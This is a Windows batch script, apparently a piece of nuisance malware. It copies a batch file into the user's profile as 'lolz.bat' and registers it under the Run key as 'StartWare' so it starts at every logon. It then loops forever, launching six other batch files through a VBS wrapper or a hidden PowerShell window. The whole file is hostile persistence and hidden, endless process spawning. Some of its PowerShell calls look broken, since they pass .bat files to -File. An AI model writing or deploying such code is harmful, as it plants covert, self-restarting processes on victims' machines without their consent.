@echo off

setlocal
set "vbsFile=%PUBLIC%\vbs\file.vbs"

copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Captures\lolz.bat"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Captures\lolz.bat" /f

:loop

if exist "%vbsFile%" (
    wscript "%vbsFile%" "%PUBLIC%\sigma\filel.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\file.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\sigma.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\copy.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\startup.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\lulz.bat"
) else (
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\file.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\sigma.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\copy.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\startup.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\filel.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\lulz.bat"
)

goto loop
